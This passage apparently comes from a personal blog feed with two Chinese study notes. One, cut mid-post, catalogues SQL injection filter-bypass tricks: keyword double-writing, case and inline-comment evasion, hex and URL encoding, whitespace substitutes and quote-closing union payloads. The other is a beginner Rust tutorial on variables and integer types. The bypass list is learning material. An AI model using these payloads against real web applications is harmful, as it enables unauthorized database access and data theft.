<span class="operator">|</span> NEXT &#125; [ <span class="keyword">WHERE</span> where_condition ] [LIMIT … ]</span><br><span class="line">HANDLER tbl_name <span class="keyword">CLOSE</span></span><br></pre></td></tr></table></figure><h3 id="SQL注入绕过"><a href="#SQL注入绕过" class="headerlink" title="SQL注入绕过"></a>SQL注入绕过</h3><h4 id="1-注释字符绕过"><a href="#1-注释字符绕过" class="headerlink" title="1.注释字符绕过"></a><strong>1.注释字符绕过</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-- 注释内容</span><br><span class="line"># 注释内容      url编码为%23</span><br><span class="line">/*注释内容*/</span><br><span class="line">;</span><br><span class="line">/x00</span><br></pre></td></tr></table></figure><h4 id="2-双写绕过"><a href="#2-双写绕过" class="headerlink" title="2.双写绕过"></a><strong>2.双写绕过</strong></h4><p>绕过场景：代码使用replace将字符代替为空时使用</p><p>例如，过滤了select</p><p>使用<code>selselectect =&gt;select</code></p><h4 id="3-大写绕过"><a href="#3-大写绕过" class="headerlink" title="3.大写绕过"></a><strong>3.大写绕过</strong></h4><p>在正则匹配对大小写不敏感时，也就是正则匹配使用了<code>\i</code>，忽略了大小写。而Mysql对大小写也不敏感时使用</p><p>例如，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/select/i</span><br><span class="line"></span><br><span class="line">使用SeLect进行绕过</span><br></pre></td></tr></table></figure><h4 id="4-内联注释"><a href="#4-内联注释" class="headerlink" title="4.内联注释"></a><strong>4.内联注释</strong></h4><p><strong>内联注释的作用是增加SQL语句的可移植性。比如，将MySQL特有的语法使用内联注释的形式来编写，在这种情况下，MySQL可以正常的解析并执行内联注释中的代码，但是其它的SQL服务器则忽略内联注释中的内容。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/*! MySQL特有的语法 */</span><br></pre></td></tr></table></figure><p>例如MySQL服务器可以在以下语句中识别<code>STRAIGHT_JOIN</code>关键字，而其他服务器则不能：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT /*! STRAIGHT_JOIN*/ col1 FROM table1,table2 WHERE ...</span><br></pre></td></tr></table></figure><p>&#x2F;*! *&#x2F;类型的注释，内部语句会被执行</p><p>一般用来绕过空格</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select bbb from table1 where aaa=&#x27;&#x27; union /*! select database()*/;</span><br></pre></td></tr></table></figure><h4 id="5-特殊编码绕过"><a href="#5-特殊编码绕过" class="headerlink" title="5.特殊编码绕过"></a><strong>5.特殊编码绕过</strong></h4><p>16进制编码绕过</p><p>如果在查询字段名的时候表名被过滤，或者是数据库中某些特定字符被过滤，则可以使用16进制绕过。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select column_name from information_schema.columns where table_name=0x7573657273;</span><br></pre></td></tr></table></figure><p><code>0x7573657273</code>为users的16进制编码</p><h4 id="6-双重url编码绕过"><a href="#6-双重url编码绕过" class="headerlink" title="6.双重url编码绕过"></a><strong>6.双重url编码绕过</strong></h4><p>对字符串进行二次url编码，可绕过关键字过滤</p><h4 id="7-空格绕过"><a href="#7-空格绕过" class="headerlink" title="7.空格绕过"></a><strong>7.空格绕过</strong></h4><p>可以使用%0d(回车)、%0a(换行)、%09(tab制表)、&#x2F;**&#x2F;、%a0(&amp;nbsp）、%0b(垂直制表符)、%0c（换页符）</p><h4 id="8-过滤了-and、or、-、-、"><a href="#8-过滤了-and、or、-、-、" class="headerlink" title="8.过滤了 and、or、&#x3D;、&gt;、&lt;、regexp"></a>8.过滤了 and、or、&#x3D;、&gt;、&lt;、regexp</h4><p>使用 &amp;&amp;、||、 like、greatest(返回值的最大值)、least（返回值的最小值）</p><h4 id="9-过滤了逗号"><a href="#9-过滤了逗号" class="headerlink" title="9.过滤了逗号"></a><strong>9.过滤了逗号</strong></h4><p>limit使用from或者offset</p><p>select substr(database(0from1for1);select mid(database(0from1for1);</p><p>substr使用from for</p><p>select * from news limit 0,1 &lt;&#x3D;&gt; select * from news limit 1 offset 0</p><p>if语句使用exp()函数代替</p><p>exp()函数除了能用在报错注入以外，利用exp在参数大于709时会报错的特性可以用来构造条件判断语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">||exp(710-(... rlike ...))</span><br></pre></td></tr></table></figure><p>即如果 <code>(... rlike ...)</code> 中的语句执行匹配后的结果为<code>True</code>，经过减号转换后为 <code>exp(710-1)</code> 后不会溢出；若为<code>false</code>，转换为 <code>exp(710-0)</code> 后则会溢出并报错</p><h4 id="10、绕过注释符号（-，–）过滤"><a href="#10、绕过注释符号（-，–）过滤" class="headerlink" title="10、绕过注释符号（#，–）过滤"></a><strong>10、绕过注释符号（#，–）过滤</strong></h4><p>使用单引号、双引号进行引号闭合绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=&#x27;$_POST[id]&#x27; LIMIT 0,1</span><br></pre></td></tr></table></figure><p>我们传入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and 1=2 union select 1,2,3&#x27; </span><br></pre></td></tr></table></figure><p>这样语句就变成了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=&#x27;1&#x27; and 1=2 union select 1,2,3&#x27; &#x27; LIMIT 0,1</span><br></pre></td></tr></table></figure><p>引号正常闭合</p><h4 id="11、绕过union，select，where等"><a href="#11、绕过union，select，where等" class="headerlink" title="11、绕过union，select，where等"></a>11、绕过union，select，where等</h4><p>可尝试在关键字内插入&#x2F;**&#x2F;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">U/**/NION/**/SE/**/LECT/**/user，pwd from user</span><br><span class="line"></span><br><span class="line">union select user,pwd from user</span><br></pre></td></tr></table></figure><h4 id="12-等价函数绕过"><a href="#12-等价函数绕过" class="headerlink" title="12.等价函数绕过"></a>12.等价函数绕过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">hex()、bin() ==&gt; ascii()</span><br><span class="line">sleep() ==&gt;benchmark()</span><br><span class="line">concat_ws()==&gt;group_concat()</span><br><span class="line">mid()、substr() ==&gt; substring()</span><br><span class="line">@@user ==&gt; user()</span><br><span class="line">@@datadir ==&gt; datadir()</span><br></pre></td></tr></table></figure><h4 id="13-information过滤"><a href="#13-information过滤" class="headerlink" title="13.information过滤"></a>13.information过滤</h4><p><code>sys.schema_auto_increment_columns</code>代替<code>information_schema</code>，用来对表自增ID的监控</p><p>但是 <code>sys.schema_auto_increment_columns</code>这个库有些局限性，一般要超级管理员才可以访问sys。</p><p>类似可以利用的表还有：<code>mysql.innodb_table_stats</code>、<code>mysql.innodb_table_index</code>同样存放有库名表名</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerlink&quot; title=&quot;原理&quot;&gt;&lt;/a&gt;原理&lt;/h3&gt;&lt;p&gt;sql注入发生原理：&lt;/p&gt;
&lt;p&gt;用户对传入的参数未进行严格过滤处理，导致构造形成sql语句，直接输入数据库执行，从而获取和修改数据库&lt;/</summary>
      
    
    
    
    <category term="学习笔记" scheme="https://kinseyy.github.io/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="sql注入" scheme="https://kinseyy.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>rust学习</title>
    <link href="https://kinseyy.github.io/2025/03/26/rust%E5%AD%A6%E4%B9%A0/"/>
    <id>https://kinseyy.github.io/2025/03/26/rust%E5%AD%A6%E4%B9%A0/</id>
    <published>2025-03-26T11:07:14.000Z</published>
    <updated>2025-04-20T12:37:53.937Z</updated>
    
    <content type="html"><![CDATA[<h3 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h3><p><strong>Rust</strong> 是由 Mozilla 团队于 2010 年推出的系统级编程语言，专注于 <strong>安全性</strong>、<strong>性能</strong> 和 <strong>并发性</strong>。它通过独特的编译时检查机制（如所有权系统），在无需垃圾回收（GC）的前提下保障内存安全，同时性能媲美 C&#x2F;C++，被 Stack Overflow 评为最受开发者喜爱的语言之一（2016-2023 连续多年）。</p><p>我们来通过一段代码来简单浏览一下Rust语法</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Rust 程序入口函数，跟其它语言一样，都是 main，该函数目前无返回值</span></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="comment">// 使用let来声明变量，进行绑定，a是不可变的</span></span><br><span class="line">    <span class="comment">// 此处没有指定a的类型，编译器会默认根据a的值为a推断类型：i32，有符号32位整数</span></span><br><span class="line">    <span class="comment">// 语句的末尾必须以分号结尾</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">a</span> = <span class="number">10</span>;</span><br><span class="line">    <span class="comment">// 主动指定b的类型为i32</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">b</span>: <span class="type">i32</span> = <span class="number">20</span>;</span><br><span class="line">    <span class="comment">// 这里有两点值得注意：</span></span><br><span class="line">    <span class="comment">// 1. 可以在数值中带上类型:30i32表示数值是30，类型是i32</span></span><br><span class="line">    <span class="comment">// 2. c是可变的，mut是mutable的缩写</span></span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">c</span> = <span class="number">30i32</span>;</span><br><span class="line">    <span class="comment">// 还能在数值和类型中间添加一个下划线，让可读性更好</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">d</span> = <span class="number">30_i32</span>;</span><br><span class="line">    <span class="comment">// 跟其它语言一样，可以使用一个函数的返回值来作为另一个函数的参数</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">e</span> = <span class="title function_ invoke__">add</span>(<span class="title function_ invoke__">add</span>(a, b), <span class="title function_ invoke__">add</span>(c, d));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// println!是宏调用，看起来像是函数但是它返回的是宏定义的代码块</span></span><br><span class="line">    <span class="comment">// 该函数将指定的格式化字符串输出到标准输出中(控制台)</span></span><br><span class="line">    <span class="comment">// &#123;&#125;是占位符，在具体执行过程中，会把e的值代入进来</span></span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;( a + b ) + ( c + d ) = &#123;&#125;&quot;</span>, e);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个函数，输入两个i32类型的32位有符号整数，返回它们的和</span></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">add</span>(i: <span class="type">i32</span>, j: <span class="type">i32</span>) <span class="punctuation">-&gt;</span> <span class="type">i32</span> &#123;</span><br><span class="line">    <span class="comment">// 返回相加值，这里可以省略return</span></span><br><span class="line">    i + j</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意：</p><ul><li>字符串使用双引号 <code>&quot;&quot;</code> 而不是单引号 <code>&#39;&#39;</code>，Rust 中单引号是留给单个字符类型（<code>char</code>）使用的</li><li>Rust 使用 <code>&#123;&#125;</code> 来作为格式化输出占位符，其它语言可能使用的是 <code>%s</code>，<code>%d</code>，<code>%p</code> 等，由于 <code>println!</code> 会自动推导出具体的类型，因此无需手动指定</li></ul><h3 id="变量绑定与解构"><a href="#变量绑定与解构" class="headerlink" title="变量绑定与解构"></a>变量绑定与解构</h3><h4 id="变量命名"><a href="#变量命名" class="headerlink" title="变量命名"></a>变量命名</h4><p>rust和其它语言一样，都需要遵循<a href="https://course.rs/practice/naming.html">命名规范</a></p><p>下面是一些例子：</p><table><thead><tr><th>类型</th><th>命名风格</th><th>示例</th></tr></thead><tbody><tr><td>变量、函数、模块</td><td>蛇形命名法（snake_case）</td><td><code>calculate_length</code>, <code>user_name</code></td></tr><tr><td>结构体、枚举、特性</td><td>大驼峰式（PascalCase）</td><td><code>String</code>, <code>HttpRequest</code>, <code>FromStr</code></td></tr><tr><td>常量和静态变量</td><td>全大写蛇形（SCREAMING_SNAKE_CASE）</td><td><code>MAX_CONNECTIONS</code>, <code>DEFAULT_PORT</code></td></tr><tr><td>生命周期参数</td><td>短小写字母 + 单引号</td><td><code>&#39;a</code>, <code>&#39;ctx</code>, <code>&#39;static</code></td></tr><tr><td>泛型类型参数</td><td>简明的大驼峰式或单字母</td><td><code>T</code>, <code>K</code>, <code>V</code>, <code>Context</code></td></tr></tbody></table><h4 id="变量绑定"><a href="#变量绑定" class="headerlink" title="变量绑定"></a>变量绑定</h4><p>在其他的语言里，我们使用<code>var a=&quot;hello world&quot;</code>的方式给a复制，也就是把等式右边的字符串赋给了变量a，而在rust中，我们使用<code>let a=&quot;hello world&quot;</code>，我们在rust中称这个过程为变量绑定</p><p>为什么使用变量绑定忙着哩设计了Rust最核心的原则——所有权，简单来讲，任何内存对象都是有主人的，而且一般情况完全属于它的主人，绑定就是把这个对象绑定给一个变量，让这个变量成为它的主人（在这种情况下，该对象之前的主人就会丧失对该对象的所有权）</p><p>绑定就意味着不可变了吗？</p><h4 id="变量的可变性"><a href="#变量的可变性" class="headerlink" title="变量的可变性"></a>变量的可变性</h4><p>Rust一般情况下是不可变的，但如果实在想变，可以使用**<code>mut</code>**关键字来使变量可变</p><p>如果我们不使用<code>mut</code>，那么变量一旦绑定一个数，就不能再绑定另一个数了</p><p>例如我们不使用mut ，在新建的 <em>variables</em> 目录下，编辑 <em>src&#x2F;main.rs</em> ，改为下面代码：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">x</span> = <span class="number">5</span>;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;The value of x is: &#123;&#125;&quot;</span>, x);</span><br><span class="line">    x = <span class="number">6</span>;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;The value of x is: &#123;&#125;&quot;</span>, x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>保存文件，再用cargo run运行</p><p><strong><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202503261937218.png" alt="image-20250326193653127" loading="lazy"></strong> </p><p>报了一个错，具体的错误原因是 <code>cannot assign twice to immutable variable x</code>（无法对不可变的变量进行重复赋值），因为我们想为不可变的 <code>x</code> 变量再次赋值。</p><p>这种错误是为了避免无法预期的错误发生在我们的变量上：一个变量往往被多处代码所使用，其中一部分代码假定该变量的值永远不会改变，而另外一部分代码却无情的改变了这个值，在实际开发过程中，这个错误是很难被发现的，特别是在多线程编程中。</p><p>如果我们使用mut，代码就能成功执行</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">x</span> = <span class="number">5</span>;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;The value of x is: &#123;&#125;&quot;</span>, x);</span><br><span class="line">    x = <span class="number">6</span>;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;The value of x is: &#123;&#125;&quot;</span>, x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202503261939795.png" alt="image-20250326193919766" loading="lazy"></strong></p><p>所以选择可变还是不可变，取决于你的使用场景，例如不可变可以带来安全性，但是丧失了灵活性和性能（如果你要改变，就要重新创建一个新的变量，这里涉及到内存对象的再分配）。而可变变量最大的好处就是使用上的灵活性和性能上的提升。</p><h4 id="使用下划线开头忽略未使用的变量"><a href="#使用下划线开头忽略未使用的变量" class="headerlink" title="使用下划线开头忽略未使用的变量"></a>使用下划线开头忽略未使用的变量</h4><p>如果你创建了一个变量却不在任何地方使用它，Rust就会给出一个警告，因为这可能会是个 BUG，如果不希望rust给出警告，就可以在rust前面加一个下划线来避免它</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>()&#123;</span><br><span class="line"><span class="keyword">let</span> <span class="variable">_x</span>=<span class="number">10</span>;</span><br><span class="line"><span class="keyword">let</span> <span class="variable">y</span>=<span class="number">10</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202503261950017.png" alt="image-20250326195013988" loading="lazy"></p><p>可以看到，两个变量都是只有声明，没有使用，但是编译器却独独给出了 <code>y</code> 未被使用的警告，充分说明了 <code>_</code> 变量名前缀在这里发挥的作用。并且rust给出了修复的建议</p><h4 id="变量解构"><a href="#变量解构" class="headerlink" title="变量解构"></a>变量解构</h4><p>let 表达式不仅仅用于变量的绑定，而且还能进行复杂变量的解构:从一个相对复杂的变量里，匹配出该变量的一部分.</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> (a, <span class="keyword">mut</span> b): (<span class="type">bool</span>,<span class="type">bool</span>) = (<span class="literal">true</span>, <span class="literal">false</span>);</span><br><span class="line">    <span class="comment">// a = true,不可变; b = false，可变</span></span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;a = &#123;:?&#125;, b = &#123;:?&#125;&quot;</span>, a, b);</span><br><span class="line"></span><br><span class="line">    b = <span class="literal">true</span>;</span><br><span class="line">    <span class="built_in">assert_eq!</span>(a, b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="解构式赋值"><a href="#解构式赋值" class="headerlink" title="解构式赋值"></a>解构式赋值</h5><p>解构式赋值是指将一个复合数据类型（如元组、数组、结构体等）的内部值提取并赋值给多个变量的操作。在 Rust 中，解构赋值通常用于将一个复杂的数据结构的各个部分提取到单独的变量中。</p><p>解构式赋值在 Rust 中并不直接使用“赋值”的形式（如传统编程语言中的解构赋值），而是通过模式匹配来实现的。在 Rust 中，这种解构通常是通过 <code>let</code> 语句和匹配模式（如元组模式、数组模式、结构体模式等）来完成的。</p><p>在 <a href="https://course.rs/appendix/rust-versions/1.59.html">Rust 1.59</a> 版本后，我们可以在赋值语句的左式中使用元组、切片和结构体模式了。</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Struct</span> &#123;</span><br><span class="line">    e: <span class="type">i32</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> (a, b, c, d, e);</span><br><span class="line"></span><br><span class="line">    (a, b) = (<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="comment">// _ 代表匹配一个值，但是我们不关心具体的值是什么，因此没有使用一个变量名而是使用了 _</span></span><br><span class="line">    [c, .., d, _] = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line">    Struct &#123; e, .. &#125; = Struct &#123; e: <span class="number">5</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">assert_eq!</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">5</span>], [a, b, c, d, e]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这种使用方式跟之前的 <code>let</code> 保持了一致性，但是 <code>let</code> 会重新绑定，而这里仅仅是对之前绑定的变量进行再赋值。</p><p>需要注意的是，使用 <code>+=</code> 的赋值语句还不支持解构式赋值。</p><h4 id="变量和常量之间的差异"><a href="#变量和常量之间的差异" class="headerlink" title="变量和常量之间的差异"></a>变量和常量之间的差异</h4><p>变量的值不能更改可能让你想起其他另一个很多语言都有的编程概念：<strong>常量</strong>(<em>constant</em>)。与不可变变量一样，常量也是绑定到一个常量名且不允许更改的值，但是常量和变量之间存在一些差异：</p><ul><li>常量不允许使用 <code>mut</code>。<strong>常量不仅仅默认不可变，而且自始至终不可变</strong>，因为常量在编译完成后，已经确定它的值。</li><li>常量使用 <code>const</code> 关键字而不是 <code>let</code> 关键字来声明，并且值的类型<strong>必须</strong>标注。</li></ul><p>下面是一个常量声明的例子，其常量名为 <code>MAX_POINTS</code>，值设置为 <code>100,000</code>。（Rust 常量的命名约定是全部字母都使用大写，并使用下划线分隔单词，另外对数字字面量可插入下划线以提高可读性）：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> MAX_POINTS: <span class="type">u32</span> = <span class="number">100_000</span>;</span><br></pre></td></tr></table></figure><p>常量可以在任意作用域内声明，包括全局作用域，在声明的作用域内，常量在程序运行的整个过程中都有效。对于需要在多处代码共享一个不可变的值时非常有用，例如游戏中允许玩家赚取的最大点数或光速。</p><blockquote><p>在实际使用中，最好将程序中用到的硬编码值都声明为常量，对于代码后续的维护有莫大的帮助。如果将来需要更改硬编码的值，你也只需要在代码中更改一处即可。</p></blockquote><h4 id="变量的遮蔽"><a href="#变量的遮蔽" class="headerlink" title="变量的遮蔽"></a>变量的遮蔽</h4><p>rust允许声明相同的变量名，但后面的变量名会遮蔽掉前面的变量名</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">x</span> = <span class="number">5</span>;</span><br><span class="line">    <span class="comment">// 在main函数的作用域内对之前的x进行遮蔽</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">x</span> = x + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 在当前的花括号作用域内，对之前的x进行遮蔽</span></span><br><span class="line">        <span class="keyword">let</span> <span class="variable">x</span> = x * <span class="number">2</span>;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;The value of x in the inner scope is: &#123;&#125;&quot;</span>, x);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;The value of x is: &#123;&#125;&quot;</span>, x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202503262007537.png" alt="image-20250326200735503" loading="lazy"></p><p>这个程序首先将数值 <code>5</code> 绑定到 <code>x</code>，然后通过重复使用 <code>let x =</code> 来遮蔽之前的 <code>x</code>，并取原来的值加上 <code>1</code>，所以 <code>x</code> 的值变成了 <code>6</code>。第三个 <code>let</code> 语句同样遮蔽前面的 <code>x</code>，取之前的值并乘上 <code>2</code>，得到的 <code>x</code> 最终值为 <code>12</code>。</p><p>这和 <code>mut</code> 变量的使用是不同的，第二个 <code>let</code> 生成了完全不同的新变量，两个变量只是恰好拥有同样的名称，涉及一次内存对象的再分配 ，而 <code>mut</code> 声明的变量，可以修改同一个内存地址上的值，并不会发生内存对象的再分配，性能要更好。</p><h3 id="基本类型"><a href="#基本类型" class="headerlink" title="基本类型"></a>基本类型</h3><p>Rust 每个值都有其确切的数据类型，总的来说可以分为两类：基本类型和复合类型。 基本类型意味着它们往往是一个最小化原子类型，无法解构为其它类型（一般意义上来说），由以下组成：</p><ul><li>数值类型：有符号整数 (<code>i8</code>, <code>i16</code>, <code>i32</code>, <code>i64</code>, <code>isize</code>)、 无符号整数 (<code>u8</code>, <code>u16</code>, <code>u32</code>, <code>u64</code>, <code>usize</code>) 、浮点数 (<code>f32</code>, <code>f64</code>)、以及有理数、复数</li><li>字符串：字符串字面量和字符串切片 <code>&amp;str</code></li><li>布尔类型：<code>true</code> 和 <code>false</code></li><li>字符类型：表示单个 Unicode 字符，存储为 4 个字节</li><li>单元类型：即 <code>()</code> ，其唯一的值也是 <code>()</code></li></ul><h4 id="数值类型"><a href="#数值类型" class="headerlink" title="数值类型"></a>数值类型</h4><h5 id="整数类型"><a href="#整数类型" class="headerlink" title="整数类型"></a>整数类型</h5><p>整数是没有小数部分的数字，之前使用过的i32类型，表示有符号的32为整数(i是英文单词integer的首字母，与之相反的是u，代表无符号的unsigned类型），下表显示了Rust中的内置函数整数类型:</p><table><thead><tr><th>长度</th><th>有符号类型</th><th>无符号类型</th></tr></thead><tbody><tr><td>8 位</td><td><code>i8</code></td><td><code>u8</code></td></tr><tr><td>16 位</td><td><code>i16</code></td><td><code>u16</code></td></tr><tr><td>32 位</td><td><code>i32</code></td><td><code>u32</code></td></tr><tr><td>64 位</td><td><code>i64</code></td><td><code>u64</code></td></tr><tr><td>128 位</td><td><code>i128</code></td><td><code>u128</code></td></tr><tr><td>视架构而定</td><td><code>isize</code></td><td><code>usize</code></td></tr></tbody></table><p>类型定义的形式统一为：<code>有无符号 + 类型大小(位数)</code>。<strong>无符号数</strong>表示数字只能取正数和 0，而<strong>有符号</strong>则表示数字可以取正数、负数还有 0。就像在纸上写数字一样：当要强调符号时，数字前面可以带上正号或负号；然而，当很明显确定数字为正数时，就不需要加上正号了。有符号数字以<a href="https://en.wikipedia.org/wiki/Two's_complement">补码</a>形式存储。</p><p>每个有符号类型规定的数字范围是 -(2n - 1) ~ 2n - 1 - 1，其中 <code>n</code> 是该定义形式的位长度。因此 <code>i8</code> 可存储数字范围是 -(27) ~ 27 - 1，即 -128 ~ 127。无符号类型可以存储的数字范围是 0 ~ 2n - 1，所以 <code>u8</code> 能够存储的数字为 0 ~ 28 - 1，即 0 ~ 255。</p><p>此外，<code>isize</code> 和 <code>usize</code> 类型取决于程序运行的计算机 CPU 类型： 若 CPU 是 32 位的，则这两个类型是 32 位的，同理，若 CPU 是 64 位，那么它们则是 64 位。</p><p>整型字面量可以用下表的形式书写：</p><table><thead><tr><th>数字字面量</th><th>示例</th></tr></thead><tbody><tr><td>十进制</td><td><code>98_222</code></td></tr><tr><td>十六进制</td><td><code>0xff</code></td></tr><tr><td>八进制</td><td><code>0o77</code></td></tr><tr><td>二进制</td><td><code>0b1111_0000</code></td></tr><tr><td>字节 (仅限于 <code>u8</code>)</td><td><code>b&#39;A&#39;</code></td></tr></tbody></table><h6 id="整型溢出"><a href="#整型溢出" class="headerlink" title="整型溢出"></a>整型溢出</h6><p>假设我们有个u8类型的数，它可以存放0到255的数，如果我们修改为256或更大，就会发生整型溢出，关于这一行为 Rust 有一些有趣的规则：当在 debug 模式编译时，Rust 会检查整型溢出，若存在这些问题，则使程序在编译时 <em>panic</em>(崩溃,Rust 使用这个术语来表明程序因错误而退出)。</p><p>在当使用 <code>--release</code> 参数进行 release 模式构建时，Rust <strong>不</strong>检测溢出。相反，当检测到整型溢出时，Rust 会按照补码循环溢出（<em>two’s complement wrapping</em>）的规则处理。简而言之，大于该类型最大值的数值会被补码转换成该类型能够支持的对应数字的最小值。比如在 <code>u8</code> 